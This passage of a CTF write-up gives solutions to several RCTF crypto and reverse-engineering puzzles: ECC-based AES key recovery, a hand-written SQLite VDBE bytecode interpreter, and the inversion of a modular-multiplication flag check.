</span></span><span class=line><span class=cl><span class=n>G</span> <span class=o>=</span> <span class=p>(</span><span class=mh>0x161FF7528B899B2D0C28607CA52C5B86</span><span class=p>,</span>
</span></span><span class=line><span class=cl>     <span class=mh>0xCF5AC8395BAFEB13C02DA292DDED7A83</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mh>0xFFFFFFFE0000000075A30D1B9038A115</span>
</span></span><span class=line><span class=cl><span class=n>h</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>s128r1</span> <span class=o>=</span> <span class=n>EllipticCurve</span><span class=p>(</span><span class=n>F</span><span class=p>,</span> <span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>G</span> <span class=o>=</span> <span class=n>s128r1</span><span class=p>(</span><span class=n>G</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># copied from terminal</span>
</span></span><span class=line><span class=cl><span class=n>bx</span> <span class=o>=</span> <span class=mh>0x2d5381d8a0fdf4ca9afa662726aed8b2</span>
</span></span><span class=line><span class=cl><span class=n>g2</span> <span class=o>=</span> <span class=s1>&#39;038151a0c6b92171db199db84be753a97e&#39;</span>
</span></span><span class=line><span class=cl><span class=n>msg</span> <span class=o>=</span> <span class=s1>&#39;aa19f4de6c487c333855a2fab0e95a8a44f143760283eabdf985bde4fad89067&#39;</span>
</span></span><span class=line><span class=cl><span class=n>ss</span> <span class=o>=</span> <span class=n>uncompress</span><span class=p>(</span><span class=n>bx</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>ak</span> <span class=o>=</span> <span class=s1>&#39;</span><span class=si>{:016x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>ss</span><span class=p>[</span><span class=mi>0</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>ak</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>msg</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;hex&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>cp</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>ak</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;hex&#39;</span><span class=p>),</span> <span class=n>mode</span><span class=o>=</span><span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>,)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cp</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>msg</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;hex&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># &#39;RCTF{UgotTHEpoint}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>### Helper functions</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>uncompress</span><span class=p>(</span><span class=n>px</span><span class=p>,</span> <span class=n>s</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span> <span class=o>=</span> <span class=n>x</span><span class=o>**</span><span class=mi>3</span> <span class=o>+</span><span class=n>a</span><span class=o>*</span><span class=n>x</span> <span class=o>+</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>    <span class=n>y</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>f</span><span class=p>(</span><span class=n>x</span><span class=o>=</span><span class=n>px</span><span class=p>)),</span> <span class=nb>int</span><span class=p>((</span><span class=n>p</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>/</span><span class=mi>4</span><span class=p>),</span> <span class=n>p</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>s</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>s128r1</span><span class=p>((</span><span class=n>px</span><span class=p>,</span> <span class=n>p</span><span class=o>-</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>s128r1</span><span class=p>((</span><span class=n>px</span><span class=p>,</span> <span class=n>y</span><span class=p>))</span>
</span></span></code></pre></div><h2 class="relative group">SQL<div id=sql class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#sql aria-label=Anchor>#</a></span></h2><h3 class="relative group">Overview<div id=overview-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#overview-2 aria-label=Anchor>#</a></span></h3><p>Novel reverse challenge</p><p>We are given log file</p><pre tabindex=0><code>SQLite version 3.8.2 2013-12-06 14:53:30
Enter &#34;.help&#34; for instructions
Enter SQL statements terminated with a &#34;;&#34;
sqlite&gt; explain [redacted]
0|Trace|0|0|0||00|
1|Goto|0|93|0||00|
        ...
</code></pre><p><em>explain</em> is an sqlite statement which tells the dbms to output the underlying vm commands for a given query</p><p>I found a couple of interesting articles about <em>explain</em> and <em>SQLite‚Äôs ‚ÄúVirtual DataBase Engine‚Äù</em></p><ol><li><a href=https://medium.com/@JasonWyatt/squeezing-performance-from-sqlite-explaining-the-virtual-machine-2550ef6c5db target=_blank>https://medium.com/@JasonWyatt/squeezing-performance-from-sqlite-explaining-the-virtual-machine-2550ef6c5db</a></li><li><a href=https://stackoverflow.com/questions/17663379/how-to-understand-sqlite-explain-query-plan-result target=_blank>https://stackoverflow.com/questions/17663379/how-to-understand-sqlite-explain-query-plan-result</a></li><li><a href=https://github.com/endlesssoftware/sqlite3/blob/master/vdbe.c target=_blank>https://github.com/endlesssoftware/sqlite3/blob/master/vdbe.c</a></li></ol><p>The most important is the official vdbe opcode documentation <a href=https://www.sqlite.org/opcode.html target=_blank>https://www.sqlite.org/opcode.html</a></p><h3 class="relative group">Solution<div id=solution-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-1 aria-label=Anchor>#</a></span></h3><p>We just have to implement a basic vdbe interpreter</p><p>We made some educated guesses to simplify our work</p><ol><li>only implemented Goto,OpenRead,String8,Integer,Function (limited to substr),Ne and Halt</li><li>the first part of the code sets up a lookup table</li><li>the second part picks a character of the flag at a time and compares it with the right value</li></ol><h4 class="relative group">Important pattern<div id=important-pattern class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#important-pattern aria-label=Anchor>#</a></span></h4><p>Select XXXX-th character to compare with character in register BBBB, jump to HALT if not equal</p><pre tabindex=0><code>98|String8|0|BBBB|0|f|00|
139|Integer|XXXX|AAAA+1|0||00|
140|Integer|1|AAAA+2|0||00|
52|Column|0|0|AAAA||00|
53|Function|6|AAAA|1|substr(3)|03|
54|Ne|BBBB|90|1||6a|
</code></pre><h4 class="relative group">Solver code<div id=solver-code class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solver-code aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>logging</span> <span class=kn>import</span> <span class=n>log</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>logging</span>
</span></span><span class=line><span class=cl><span class=n>logi</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>msg</span><span class=p>:</span> <span class=n>log</span><span class=p>(</span><span class=n>logging</span><span class=o>.</span><span class=n>INFO</span><span class=p>,</span> <span class=n>msg</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=n>logw</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>msg</span><span class=p>:</span> <span class=n>log</span><span class=p>(</span><span class=n>logging</span><span class=o>.</span><span class=n>WARNING</span><span class=p>,</span> <span class=n>msg</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=n>loge</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>msg</span><span class=p>:</span> <span class=n>log</span><span class=p>(</span><span class=n>logging</span><span class=o>.</span><span class=n>ERROR</span><span class=p>,</span> <span class=n>msg</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>SQLvm</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>mem</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>regs</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>flag</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;&#39;</span><span class=p>]</span> <span class=o>*</span> <span class=mi>200</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=s1>&#39;pc&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>mem</span> <span class=o>=</span> <span class=n>mem</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>step</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=s1>&#39;pc&#39;</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=s1>&#39;pc&#39;</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>code</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;Goto&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=s1>&#39;pc&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>code</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;OpenRead&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>logw</span><span class=p>(</span><span class=s1>&#39;OpenRead&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>cursor</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>code</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;String8&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>2</span><span class=p>])]</span> <span class=o>=</span> <span class=n>code</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>logw</span><span class=p>(</span><span class=s1>&#39;</span><span class=si>{}</span><span class=s1> = </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>code</span><span class=p>[</span><span class=mi>4</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>code</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;Integer&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>2</span><span class=p>])]</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>code</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;Column&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>logw</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>flag</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>3</span><span class=p>])]</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>3</span><span class=p>])]</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>3</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>code</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;Function&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># s = self.regs[int(code[2])]</span>
</span></span><span class=line><span class=cl>            <span class=c1># x = self.regs[int(code[2]) + 1]</span>
</span></span><span class=line><span class=cl>            <span class=c1># y = self.regs[int(code[2]) + 2]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>3</span><span class=p>])]</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>code</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;Ne&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>logw</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>logw</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>flag</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>flag</span><span class=p>[</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>3</span><span class=p>])]]</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>1</span><span class=p>])]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>3</span><span class=p>])]</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>1</span><span class=p>])]</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>3</span><span class=p>])]</span> <span class=o>!=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>1</span><span class=p>])]:</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=s1>&#39;pc&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>code</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;Halt&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>logw</span><span class=p>(</span><span class=s1>&#39;Halted&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>loge</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># put the log file there</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;0|Trace|0|0|0||00|
</span></span></span><span class=line><span class=cl><span class=s1>1|Goto|0|93|0||00|
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>....
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>165|Goto|0|2|0||00|&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>compcode</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>code</span><span class=o>.</span><span class=n>splitlines</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>compcode</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>vm</span> <span class=o>=</span> <span class=n>SQLvm</span><span class=p>(</span><span class=n>compcode</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># step until halt</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=ow>not</span> <span class=n>vm</span><span class=o>.</span><span class=n>step</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>pass</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=n>vm</span><span class=o>.</span><span class=n>regs</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>type</span><span class=p>(</span><span class=n>vm</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>k</span><span class=p>])</span> <span class=o>==</span> <span class=nb>type</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>k</span><span class=p>,</span> <span class=n>vm</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>k</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>vm</span><span class=o>.</span><span class=n>flag</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;flag</span><span class=si>{lqs_rof_galf_esreve_a}</span><span class=s1>&#39;</span>
</span></span></code></pre></div><h3 class="relative group">Note<div id=note class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#note aria-label=Anchor>#</a></span></h3><p>Since we made some approximations or mistakes, the output is not correct, but it is easy to guess the right flag
<code>flag{lqs_rof_galf_esrever_a}</code></p><h2 class="relative group">babyre2<div id=babyre2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#babyre2 aria-label=Anchor>#</a></span></h2><p><a href="https://drive.google.com/open?id=1QAnMBvmftbM51fHkfsbO1xixSC26XKmS" target=_blank>Attachment</a></p><h3 class="relative group">Overview<div id=overview-3 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#overview-3 aria-label=Anchor>#</a></span></h3><p>Reverse challenge</p><p>We are given a binary with xmm instructions</p><p>It takes a string as input and then multiplies it with some constants on the stack takes the remainder mod 0xFFFFFFFFFFFFFFC5 (which is prime) and saves the results on the stack</p><p>function at 0x400BA0 takes three arguments (flag[i] * multipl[i], modulus, 0)</p><ul><li>when the third argument is 0 is computes (flag[i] * multipl[i]) % modulus</li></ul><p>from 0x40098F on in the main it xors the results with some global variable and checks if the every xor is 0</p><p>if we pass the check it prints &ldquo;Correct. Congratulations!&rdquo;</p><h3 class="relative group">Solution<div id=solution-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-2 aria-label=Anchor>#</a></span></h3><p>Since every step is invertible we just reverse the algorithm and get the flag with the formula:</p><pre tabindex=0><code>flag[i] = ((int64*) xmm)[i] * multipl[i]^-1
</code></pre><p>Now copy the constants from the binary and we are done</p><h3 class="relative group">Script (sagemath)<div id=script-sagemath class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#script-sagemath aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.strxor</span> <span class=kn>import</span> <span class=n>strxor</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=n>xrange</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pieces</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=mh>0xffffffffffffffff</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=mi>16</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mi>2334392307038315863</span><span class=n>L</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>2325638905700839284</span><span class=n>L</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mi>7298118523202646066</span><span class=n>L</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=mi>2333181762011686258</span><span class=n>L</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=mi>7142785229535732034</span><span class=n>L</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span> <span class=mi>7306930302321713512</span><span class=n>L</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span> <span class=o>=</span> <span class=mi>8462115405118268960</span><span class=n>L</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xffffffffffff002e</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>=</span> <span class=mi>2</span><span class=o>^</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span> <span class=o>=</span> <span class=mi>2</span><span class=o>^</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>=</span> <span class=mi>2</span><span class=o>^</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span><span class=p>[</span><span class=mi>11</span><span class=p>]</span> <span class=o>=</span> <span class=mi>2</span><span class=o>^</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=o>=</span> <span class=mi>2</span><span class=o>^</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span><span class=p>[</span><span class=mi>13</span><span class=p>]</span> <span class=o>=</span> <span class=mi>2</span><span class=o>^</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span><span class=p>[</span><span class=mi>14</span><span class=p>]</span> <span class=o>=</span> <span class=mi>2</span><span class=o>^</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>multipl</span><span class=p>[</span><span class=mi>15</span><span class=p>]</span> <span class=o>=</span> <span class=mi>2</span><span class=o>^</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1># multipl[7] = 46;</span>
</span></span><span class=line><span class=cl><span class=n>length</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>multipl</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mod_value</span> <span class=o>=</span> <span class=mh>0xffffffffffffffc5</span>
</span></span><span class=line><span class=cl><span class=n>xmm_values</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>xmm_values</span><span class=o>.</span><span class=n>extend</span><span class=p>([</span><span class=mh>0x7BA58F82BD898035</span><span class=p>,</span><span class=mh>0x2B7192452905E8FB</span><span class=p>][::</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>xmm_values</span><span class=o>.</span><span class=n>extend</span><span class=p>([</span><span class=mh>0x163F756FCC221AB0</span><span class=p>,</span><span class=mh>0xA3112746582E1434</span><span class=p>][::</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>xmm_values</span><span class=o>.</span><span class=n>extend</span><span class=p>([</span><span class=mh>0xDCDD8B49EA5D7E14</span><span class=p>,</span><span class=mh>0xECC78E6FB9CBA1FE</span><span class=p>][::</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
